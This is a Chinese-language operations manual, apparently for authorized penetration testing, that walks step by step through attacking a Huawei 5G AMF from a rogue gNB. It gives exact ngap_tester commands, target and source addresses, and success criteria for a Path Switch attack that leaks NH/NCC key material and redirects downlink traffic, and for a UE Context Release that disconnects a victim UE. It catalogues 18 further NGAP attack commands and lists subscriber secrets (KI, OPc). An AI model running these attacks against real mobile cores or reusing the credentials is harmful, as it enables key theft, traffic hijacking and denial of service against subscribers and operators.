# 华为 AMF 操作手册（现场实测）

文件：`deploy/操作手册_华为AMF.md`。测试机是 **Ubuntu**。现场改不了代码，只按本节命令跑。
合法 UERANSIM 和流氓 ngap_tester 是同一个华为 AMF 上的两个 gNB。

**华为 AMF-UE-NGAP-ID 每次注册都随机。禁止 sweep。禁止用菜单里的 CASE id。**

---

**按编号一个一个做。现在做攻击 2。攻击 1 测完不要再打，也不要叠在同一条 UE 会话上。**

全部命令在**仓库根目录**（能同时 `ls deploy/extract-ue-ids.sh config/huawei.json`）。
克隆目录叫什么都行，不要死记 `~/ngap_tester`。

---

## 攻击 1：Path Switch（已测就跳过）

测完不要再打。复测必须重新注册再读 AU。

### A. 准备（每个终端都先 `cd` 到仓库根）

```bash
ls deploy/extract-ue-ids.sh config/huawei.json
chmod +x deploy/*.sh deploy/real-amf/*.sh
./deploy/field-check.sh
```

| 终端 | 作用 | 命令 | 停不停 |
|---|---|---|---|
| A | 合法 gNB | `./deploy/real-amf/run-gnb.sh` | 一直开着 |
| B | 合法 UE | `./deploy/real-amf/run-ue.sh` | 一直开着 |
| D | 读 AU / 看数据面 | 见下面 | 用完即可 |
| E | 接被切走的下行 GTP-U | 攻击**之前**先开 | 一直开到打完 |
| C | 流氓 gNB，只发 path-switch | 见下面 | 打一条就退出 |

终端 A 看到 `NG Setup procedure is successful`。  
终端 B 看到 `Registration is successful` + `PDU Session establishment is successful`，并出现 `uesimtun0`。

### B. 确认会话和内网数据面（不要 ping 8.8.8.8）

```bash
./deploy/real-amf/check-up.sh
./deploy/real-amf/check-up.sh --n3
# 华为若给了 DNN 内网地址：
PING_TARGET=<地址> ./deploy/real-amf/check-up.sh
```

记下：`uesimtun0` 的 UE_IP、网关是否回包、`--n3` 是否看到 UDP 2152。  
有 UE_IP = 会话已建。N6 不回 ping 也继续（华为常禁 ICMP）。

### C. 读这一次的 AMF-UE-NGAP-ID（AU）

```bash
./deploy/extract-ue-ids.sh          # 不要 sudo
```

抄输出里的 **`amf-ngap-id`**，这就是 `$AU`。没有的话：

```bash
~/UERANSIM/build/nr-cli --dump
~/UERANSIM/build/nr-cli UERANSIM-gnb-460-08-1 --exec "ue-list"
```

gNB 名字以 `--dump` 里 `UERANSIM-gnb-` 那行为准。  
**禁止 sweep。禁止用上次的 AU。** UE 一重注册必须重读。

### D. 流氓侧探路（终端 C）

```bash
./deploy/ngt.sh sctp-ping
# 必须 SUCCESS，源 IP = 13.254.241.142
./deploy/ngt.sh ng-setup
# 必须 ACCEPTED。REJECT = 4660/PLMN/切片没开通，不要往下打
```

华为允许多条 SCTP，**不要停终端 A**。

### E. 开 GTP-U 接收（终端 E，先于攻击）

```bash
./deploy/ngt.sh gtpu-sink --bind-ip 13.254.241.142 --port 2152
```

保持开着。攻击前这里应接近安静（下行还在合法 gNB）。

### F. 只打 Path Switch（终端 C）

把 `<AU>` 换成 C 步抄的数字，不要改其它参数：

```bash
mkdir -p evidence
./deploy/ngt.sh --evidence evidence/huawei-path-switch.jsonl \
    path-switch --source-amf-ue-id <AU> --pdu-sessions 1
```

`--attacker-ip` 默认 `auto`，会绑到 `13.254.241.142`，不要改成实验室的 172.30。

### G. 怎么判断成没成（当场填）

**控制面（看终端 C 打印）：**

| 终端 C 打印（字面） | 记什么 |
|---|---|
| `=== CROSS-gNB DISCLOSURE CONFIRMED ===` 且 `LEAKED KEY MATERIAL: NCC=… NH=…` | **控制面成功**（主证据，把 NCC/NH 整行抄下来） |
| 还有 `LEAKED UPF N3 ENDPOINT` | 额外泄了 UPF 地址/TEID，整行抄下来 |
| `PathSwitchRequestAcknowledge` 但只有 `PDU … ack-transfer (no UL-TNL…)` | ACK 了、没泄 UPF N3；有没有 NH 分开记 |
| `PathSwitchRequestFailure` 或 `ErrorIndication` | 华为挡了，把 `reply:` 那一行整行抄下来 |
| `[path-switch] no reply (victim id likely not resolvable / rejected silently)` | AU 错/过期，或包没到。重做 C 步再打一次 |

**数据面（内网）：**

| 观察 | 成功切面时 | 没切面时 |
|---|---|---|
| 终端 E `gtpu-sink` | 出现 GTP-U | 仍然没有 |
| `check-up.sh --n3`（合法 gNB 的 2152） | 变少或没有 | 和打之前差不多 |
| `check-up.sh` ping 网关/`PING_TARGET` | 若本来通，现在可能断 | 和打之前一样 |

控制面有 NH、数据面没切：也算成立（Open5GS 2.8 就是这样）。两层都写进表。

### H. 本条记录表（复制下来填）

```
日期:
AU（amf-ngap-id）:
UE_IP / 网关 / ping 是否通（打前）:
N3 合法侧 2152 打前有没有:
sctp-ping:
ng-setup:
path-switch 回复（ACK/Failure/无回）:
NH:
NCC:
UPF N3（有则抄）:
gtpu-sink 打后有没有包:
合法侧 2152 打后:
ping 打后:
备注:
```

打完若还要复测：先让终端 B 的 UE 重新注册，**重新 C 步读 AU**，再从 E/F 来。

### 这次不要做

| 不要 | 原因 |
|---|---|
| `ue-release` / `error-indication` / `ng-reset` / 其它 `$NGT` | 这次只测 Path Switch |
| `sweep` | 华为 AU 随机 |
| 菜单「Run attack CASE by id」 | AU 写死 1，N3 写死 172.30.200.9 |
| `./run.sh`（Docker） | 连的是实验室核心网 |
| 停终端 A 再打 | 华为允许多条 SCTP；停了就没有受害 UE |

---

## 攻击 2：UE Context Release（本次）

流氓 gNB 对**别人的** AU 发 `UEContextReleaseRequest`。看华为会不会把受害 UE 拆掉。

**必须用新注册、没打过 Path Switch 的会话。** 攻击 1 刚打完的话：终端 B 里 `Ctrl-C`，再 `./deploy/real-amf/run-ue.sh`，等再次 `Registration is successful`，然后重新读 AU。  
这条**不要开** `gtpu-sink`（不切 N3）。**不要**再打 `path-switch` / `chain-ps-release`。

开源上四栈四结果，华为是新靶，只按下面现象填，不要套旧结论：

| 开源对照（仅参考） | 攻击者这边 | 受害 UE |
|---|---|---|
| Open5GS / free5GC | 回 ErrorIndication 或拒绝 | 还活着 |
| OAI | 把 Release Command 发回攻击者 | 还活着 |
| SD-Core | 命令发到**合法 gNB**，攻击者常无回 | **断连** |

### A. 准备（每个终端先 `cd` 到仓库根）

合法侧若已在跑且 UE **刚重新注册过**，A/B 不用重来，从 C 步读 AU 开始。

```bash
ls deploy/extract-ue-ids.sh config/huawei.json
```

| 终端 | 作用 | 命令 | 停不停 |
|---|---|---|---|
| A | 合法 gNB | `./deploy/real-amf/run-gnb.sh` | 一直开着 |
| B | 合法 UE | `./deploy/real-amf/run-ue.sh` | 一直开着 |
| D | 读 AU / 打前打后看会话 | 见下面 | 用完即可 |
| C | 只发 ue-release | 见下面 | 打一条就退出 |

终端 A：`NG Setup procedure is successful`。  
终端 B：`Registration is successful` + `PDU Session establishment is successful`，有 `uesimtun0`。

### B. 打前基线（不要 ping 8.8.8.8）

```bash
./deploy/real-amf/check-up.sh
./deploy/real-amf/check-up.sh --n3
# 华为若给了 DNN 内网地址：
PING_TARGET=<地址> ./deploy/real-amf/check-up.sh
```

记下：UE_IP、ping 通不通、`--n3` 有没有 UDP 2152。  
再看一眼终端 A、终端 B 最后几行，后面对照有没有「Release / Radio link / 掉注册」。

### C. 读这一次的 AU

```bash
./deploy/extract-ue-ids.sh          # 不要 sudo
```

抄 **`amf-ngap-id`** = `$AU`。没有则：

```bash
~/UERANSIM/build/nr-cli --dump
~/UERANSIM/build/nr-cli UERANSIM-gnb-460-08-1 --exec "ue-list"
```

gNB 名字以 `--dump` 里 `UERANSIM-gnb-` 为准。  
**禁止 sweep。禁止用攻击 1 的旧 AU。**

### D. 流氓侧探路（终端 C）

```bash
./deploy/ngt.sh sctp-ping
# 必须 SUCCESS，源 IP = 13.254.241.142
./deploy/ngt.sh ng-setup
# 必须 ACCEPTED
```

华为允许多条 SCTP，**不要停终端 A**。

### E. 只打 UE Release（终端 C）

把 `<AU>` 换成 C 步的数字。`--ran-ue-id` 不要加（默认 1，是流氓自己的本地 ID，不是受害者的）。

```bash
mkdir -p evidence
./deploy/ngt.sh --evidence evidence/huawei-ue-release.jsonl \
    ue-release --amf-ue-id <AU>
```

### F. 打后立刻看这四处

1. **终端 C**（抄 `->` 后面整行）
2. **终端 A**（合法 gNB 有没有 UE Context Release / Radio link failure / UE 被拆）
3. **终端 B**（UE 还在不在 CM-CONNECTED、有没有重新注册、`uesimtun0` 还在不在）
4. **终端 D**

```bash
./deploy/extract-ue-ids.sh
./deploy/real-amf/check-up.sh
./deploy/real-amf/check-up.sh --n3
```

`ue-list` 空了或 AU 变了、tun 没了、N3 没了 = 受害侧有变化。

### G. 怎么判断成没成（当场填）

**控制面（终端 C 字面）：**

| 终端 C 打印 | 先记这个，再对受害侧 |
|---|---|
| `-> unsuccessfulOutcome/proc=… ErrorIndication` 或带 `ErrorIndication` | 华为对攻击者回了错。还要看受害死没死 |
| `-> successfulOutcome/proc=41 UEContextReleaseCommand` 或带 `UEContextReleaseCommand` | 命令回到了**攻击者**（开源 OAI 是这样）。受害往往还活着，以 A/B 为准 |
| `[ue-release] amf=… ran=1 -> (no reply to us)` | **常见。** 命令可能发去合法 gNB（成功切面），也可能被静默丢。**必须看 A/B/D** |
| 其它 `reply` | 整行抄下来 |

**受害侧（这才是本条成不成）：**

| 观察 | 跨 gNB 释放成功 | 被挡住 / 无效 |
|---|---|---|
| 终端 A | 出现 Release / UE 被拆 / Radio link | 和打之前一样 |
| 终端 B | 掉注册、PDU 没了、`uesimtun0` 没了 | 还在、还显示会话成功 |
| `extract-ue-ids.sh` | `ue-list` 空，或 AU 已经不是刚才那个 | 还是同一个 `amf-ngap-id` |
| `check-up.sh` / `--n3` | tun 没了，或 ping/2152 没了 | 和打前一样 |

终端 C 无回 + 终端 A 出现 Release + UE 掉线 = **本条成立**（SD-Core 那一类）。  
终端 C 回 ErrorIndication + UE 还活着 = **华为挡住了**（也是有效结论，照实记）。  
终端 C 无回 + UE 完全没变 = AU 错/过期，或包没到：重读 AU 再打一次；仍无变化就记「无回且受害无变化」。

### H. 本条记录表（复制下来填）

```
日期:
AU（amf-ngap-id，必须是本条新注册的）:
打前：UE_IP / ping / 合法侧 2152:
sctp-ping:
ng-setup:
终端 C 整行（-> 后面）:
终端 A 打后有无 Release / 掉 UE:
终端 B 打后是否还注册 / tun 还在不在:
extract-ue-ids 打后（还是同一 AU / 空 / 新 AU）:
check-up 打后:
结论（挡住 / 命令回攻击者受害还活 / 合法 gNB 被拆受害断 / 无回且无变化）:
备注:
```

复测：终端 B 重新注册，**重新读 AU**，再从 E 打。不要用旧数字。

### 这次不要做

| 不要 | 原因 |
|---|---|
| 在攻击 1 刚 Path Switch 过的同一 AU 上打本条 | 测的就不是「跨 gNB 裸释放」了 |
| `path-switch` / `chain-ps-release` / `error-indication` / `ng-reset` | 这次只测 ue-release |
| `sweep` | 华为 AU 随机 |
| 菜单「Run attack CASE by id」 | AU 写死 1 |
| 停终端 A | 没有合法 gNB 就看不到 Command 有没有打到受害侧 |
| 改 `--ran-ue-id` | 受害者靠 `--amf-ue-id`，不要改 |

---

## 0. 现场已开户参数

| 项 | 值 | 写在哪 |
|---|---|---|
| IMSI | `460081111111113` | `deploy/real-amf/real-amf.env` |
| KI | `1234567890abcde1234567890abcde12` | 同上 |
| OPc | `FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF` | 同上（`UE1_OP_TYPE=OPC`） |
| PLMN | MCC `460` / MNC `08` | env + `config/huawei.json` |
| TAC | `1` | 同上 |
| S-NSSAI | SST `1` / SD `010101` | env 里 `0x010101`，json 里 `"010101"` |
| AMF | `14.66.2.5:38412` | 同上 |
| 本机源 IP | `13.254.241.142` | env `HOST_IP`；json `bind_ip` |
| 合法 gNB-ID | `1`（`NCI=0x000000010`） | env |
| 流氓 gNB-ID | `4660` | `huawei.json`（必须已被华为允许） |

改参数只改这两个文件，然后**重启**对应进程（脚本会重新渲染 yaml）。

---

## 1. 三个终端（参考；本次按文首 Path Switch 做）

都在**仓库根目录**。**先起合法侧，再起流氓侧。不要停 UERANSIM。**

```
终端 A  ./deploy/real-amf/run-gnb.sh      # 合法 gNB，保持开着
终端 B  ./deploy/real-amf/run-ue.sh       # 合法 UE，保持开着
终端 C  ./deploy/ngt.sh …                 # 流氓 gNB，一条命令一次关联
终端 D  ./deploy/extract-ue-ids.sh        # 读本次 AU（不要 sudo；抓包才 sudo --watch）
```

### 1.1 合法侧（若还没在跑）

```bash
# 仍在仓库根目录（能 ls 到 deploy/ 和 config/）
./deploy/real-amf/run-gnb.sh
# 终端 A 看到: NG Setup procedure is successful

./deploy/real-amf/run-ue.sh
# 终端 B 看到: Registration is successful
#              PDU Session establishment is successful
#              出现网卡 uesimtun0
```

内网**不要 ping 8.8.8.8**。UE 分到地址后：

```bash
./deploy/real-amf/check-up.sh          # 看 uesimtun0 的 IP、网关、ps-list，并 ping 网关
./deploy/real-amf/check-up.sh --n3     # 再抓 8 秒合法 gNB 上的 GTP-U(UDP 2152)
# 华为若给了 DNN 内网地址：
PING_TARGET=<内网地址> ./deploy/real-amf/check-up.sh
```

有 UE_IP = PDU 会话已建。网关/PING_TARGET 有回包 = N6 通。`--n3` 能看到 2152 = UPF↔gNB 在传。
Path Switch 后：合法侧 N3 应变少，`gtpu-sink` 上应出现包。

### 1.2 流氓侧先探路

```bash
./deploy/ngt.sh sctp-ping
# 成功: SUCCESS，源 IP 应为 13.254.241.142

./deploy/ngt.sh ng-setup
# 成功: NG Setup ACCEPTED
```

`sctp-ping` timeout 时：确认 `huawei.json` 的 `bind_ip` 是 `13.254.241.142`（和 UERANSIM
同一源 IP）。华为**允许多条 SCTP**，不必停合法 gNB。仍超时就抓包看 INIT 有没有 INIT-ACK，
以及本机是否真有这张地址：`ip -4 addr | grep 13.254.241.142`。

---

## 2. 怎么拿到「这一次」的受害者标识

华为 AU 随机，**每次 UE 重新注册都会变**。打完若 UE 重注册了，必须重读。

### 办法 A（推荐）：问 gNB 的 ue-list

AU 在 **gNB** 上，不在 UE 的 `info` 里。脚本会跑：

```text
nr-cli --dump
nr-cli UERANSIM-gnb-460-08-1 --exec "ue-list"
# amf-ngap-id: <这就是 AU>
```

```bash
./deploy/extract-ue-ids.sh
```

### 办法 A2：抓包（必须在注册过程中抓）

```bash
# 先开抓，再重启终端 B 的 run-ue.sh
sudo ./deploy/extract-ue-ids.sh --watch
# 或
sudo tcpdump -i any -s 0 -w /tmp/n2.pcap host 14.66.2.5 and sctp
# Ctrl-C 后
sudo ./deploy/extract-ue-ids.sh -r /tmp/n2.pcap
```

注册完再抓 20 秒，空结果是正常的。`InitialContextSetup` 里才一定有 AU。

### 办法 B：读 UERANSIM 日志

终端 A 默认日志往往不打印 AU。GUTI 看终端 B（nr-ue）。手动能跑：

```bash
~/UERANSIM/build/nr-cli --dump
~/UERANSIM/build/nr-cli UERANSIM-gnb-460-08-1 --exec "ue-list"
```

终端 B（nr-ue）搜 `GUTI` / `5G-S-TMSI` / `TMSI`，拆出：

| 字段 | 给谁 |
|---|---|
| AMF-UE-NGAP-ID | `--amf-ue-id` / `--source-amf-ue-id` |
| 5G-TMSI（8 hex） | `--tmsi` |
| AMF Set ID（10 bit） | `--amf-set-id` |
| AMF Pointer（6 bit） | `--amf-pointer` |

### 不要用

```bash
./deploy/ngt.sh sweep --attack ue-release --amf-range 1-2000   # 对华为无效
```

---

## 3. 以后要加的攻击（本次不要跑）

仓库里能跑的 CLI 都列在这里，**方便以后按同样格式往文首后面加**。
现在只做攻击 2（ue-release）。不要发 CASE id。

`<AU>` = **这一次**从合法 NGAP 读到的 AMF-UE-NGAP-ID。每条命令（除 sctp-ping / gtpu-sink）都会自己再做一次 NG Setup。

```bash
NGT=./deploy/ngt.sh
AU=<本次读到的数字>
```

### 3.0 全部 CLI 对照（18 条可跑 + 1 条华为不要用）

| # | 命令 | 要 AU？ | 开源上测过什么 |
|---|---|---|---|
| 1 | `sctp-ping` | 否 | L4 探路 |
| 2 | `ng-setup` | 否 | 流氓 gNB 被接受 |
| 3 | `path-switch` | 要 | 泄 {NH,NCC}，有的还泄 N3 |
| 4 | `ue-release` | 要 | 跨 gNB 释放 UE |
| 5 | `error-indication` | 要 | 跨 UE 释放 |
| 6 | `ng-reset` | 要 | Open5GS 曾崩 AMF |
| 7 | `handover-required` | 要 | 强制切换 |
| 8 | `ho-window-inject` | 要 | 自开 HO 窗 + p21/p09 |
| 9 | `ran-config-update` | 否 | 假 TAI 截寻呼 |
| 10 | `ul-ran-config-transfer` | 否（要目标 gNB-ID） | SON/Xn 盲中继 |
| 11 | `initial-ue` | 否（要 GUTI） | 用 5G-S-TMSI 开新上下文 |
| 12 | `chain-ps-release` | 要 | Path Switch 紧接着 Release |
| 13 | `chain-initue-release` | GUTI（AU 可选） | InitUE 再 Release |
| 14 | `handover-notify` | 要 | p09 |
| 15 | `pdu-notify` | 要 | p06 |
| 16 | `cell-trace` | 要 | p17 |
| 17 | `ul-ran-status` | 要 | p21 |
| 18 | `ul-nrppa` | 要 | p16 |
| 19 | `gtpu-sink` | 否 | 接被重定向的下行 |
| — | `sweep` | — | **华为 AU 随机，不要用** |

菜单里 `Handover Cancel` / `Uplink Non-UE NRPPa` 显示 TODO，现场不要点。华为也不要发 3.5 的 CASE id。

### 3.1 主线

```bash
$NGT path-switch --source-amf-ue-id $AU --pdu-sessions 1
$NGT ue-release --amf-ue-id $AU
$NGT error-indication --amf-ue-id $AU
$NGT ng-reset --targets ${AU}:1
$NGT handover-required --amf-ue-id $AU
$NGT ho-window-inject --amf-ue-id $AU --mode both
$NGT ran-config-update --listen 30
$NGT ul-ran-config-transfer --target-gnb-id 1
```

### 3.2 组合链 + 单独 InitialUE

```bash
$NGT chain-ps-release --source-amf-ue-id $AU --pdu-sessions 1

$NGT initial-ue --amf-set-id 0x<setid> --amf-pointer 0x<ptr> --tmsi <8hex>

$NGT chain-initue-release \
    --amf-set-id 0x<setid> --amf-pointer 0x<ptr> --tmsi <8hex> \
    --victim-amf-ue-id $AU --release-target both
```

### 3.3 新 5 条报文

```bash
$NGT handover-notify --amf-ue-id $AU
$NGT pdu-notify      --amf-ue-id $AU
$NGT cell-trace      --amf-ue-id $AU
$NGT ul-ran-status   --amf-ue-id $AU
$NGT ul-nrppa        --amf-ue-id $AU
```

### 3.4 数据面接收（配合 path-switch）

```bash
$NGT gtpu-sink --bind-ip 13.254.241.142 --port 2152
```

### 3.5 CASE 目录 —— 华为现场不要用

`docs/cases/` 和菜单「Run attack CASE by id」是实验室变体。代码里 **AU 写死为 1**，
Path Switch 的 N3 写死 `172.30.200.9`。在华为上发出去等于打一个不存在的 UE。
主线请只用上面的 `$NGT … --amf-ue-id $AU`。

下面只作对照（哪些变体曾经存在），**不要在华为菜单里发这些 id**：

| id | 报文 |
|---|---|
| p01-a/b/c/d/f | PathSwitchRequest 变体 |
| p02-a/b | UEContextReleaseRequest 变体 |
| p03-a/b/d | HandoverRequired 变体 |
| p04-a | HandoverCancel（无独立 CLI） |
| p05-a/b/e/f | PDUSessionResourceModifyIndication |
| p06-a | PDUSessionResourceNotify |
| p09-a | HandoverNotify |
| p11-a | RRCInactiveTransitionReport |
| p12-a | UERadioCapabilityInfoIndication |
| p13-a | SecondaryRATDataUsageReport |
| p14-a | LocationReport |
| p15-a | LocationReportingFailureIndication |
| p16-a | Uplink UE-assoc NRPPa |
| p17-a | CellTrafficTrace |
| p19-a | RANCPRelocationIndication |
| p21-a | UplinkRANStatusTransfer |
| p22-a | UplinkRANEarlyStatusTransfer |
| g01-a/b/d | NGReset 变体 |
| g02-a | RANConfigurationUpdate |
| g03-a/b | NGSetupRequest 变体 |
| g04-a | ErrorIndication（非 UE 关联） |
| g07-a | PWSRestartIndication |
| g08-a | PWSFailureIndication |
| g09-a | UplinkRANConfigurationTransfer |
| g10-a | Uplink Non-UE NRPPa（无独立 CLI） |
| g11-a | UplinkRIMInformationTransfer |

交互菜单发主线（选 `7` Huawei AMF）也可以，和 `$NGT` 是同一套包。

```bash
.venv/bin/python -m ngaptester.menu
./deploy/ngt.sh -h
```

---

## 4. 怎么判断「打中了」

同时看四边：

1. **终端 C（ngt）**：ACK / Error Indication / 无回 / 解码出的 NH·NCC·N3
2. **终端 B（UE）**：是否还 `CM-CONNECTED`、`uesimtun0` 是否还在、ping 是否断
3. **终端 A（合法 gNB）**：是否出现 UE Context Release / Radio link failure
4. **华为 AMF 日志**（若能看）：该 IMSI 上下文是否被释放、是否切到 gNB 4660

建议每条命令加证据文件：

```bash
$NGT --evidence evidence/huawei-path-switch.jsonl path-switch --source-amf-ue-id $AU
```

---

## 5. 现场记录表（华为是新靶，开源结论不能直接套）

**这次填 sctp-ping / ng-setup / ue-release。** path-switch 行若攻击 1 已填就不要改。其它行留给以后。

| 攻击 | 发出 | AMF 回复 | 受害 UE | 合法 gNB | 备注 |
|---|---|---|---|---|---|
| sctp-ping | | | — | — | 源 IP= |
| ng-setup | | Accept / Reject | — | — | |
| path-switch | | | | | NH/NCC/N3? |
| ue-release | | | | | |
| error-indication | | | | | |
| ng-reset | | | | | AMF 是否还活着 |
| handover-required | | | | | |
| ho-window-inject | | | | | |
| ran-config-update | | | | | 截到 TMSI? |
| ul-ran-config-transfer | | | | | |
| initial-ue | | | | | 用 GUTI |
| chain-ps-release | | | | | |
| chain-initue-release | | | | | |
| gtpu-sink + path-switch | | | | | 是否收到下行 |
| handover-notify | | | | | |
| pdu-notify | | | | | |
| cell-trace | | | | | |
| ul-ran-status | | | | | |
| ul-nrppa | | | | | |

---

## 6. 常见问题

| 现象 | 处理 |
|---|---|
| `sctp-ping` timeout，UERANSIM 却通 | `huawei.json` 的 `bind_ip` 必须是 `13.254.241.142`。华为允许多条 SCTP，不用停合法 gNB。查本机是否有该地址、抓包看 INIT 有无 INIT-ACK |
| `ng-setup` REJECT | PLMN/TAC/切片/gNB 4660 / 源 IP 未在华为侧开通 |
| UE 认证失败 | IMSI/KI/OPc/PLMN 与开户不一致；首次 SQN re-sync 属正常 |
| 攻击「没反应」 | AU 已过期，或填成了 1 / 扫出来的假 ID。重新 `extract-ue-ids.sh` |
| `extract-ue-ids.sh` 是空的 | 注册完才抓的。先 `--watch` 再重启 UE；或直接 `./deploy/extract-ue-ids.sh` 走 nr-cli |
| 合法 UE 掉了还想打下一条 | 重新 `run-ue.sh`，重新读 AU，不要用旧数字 |
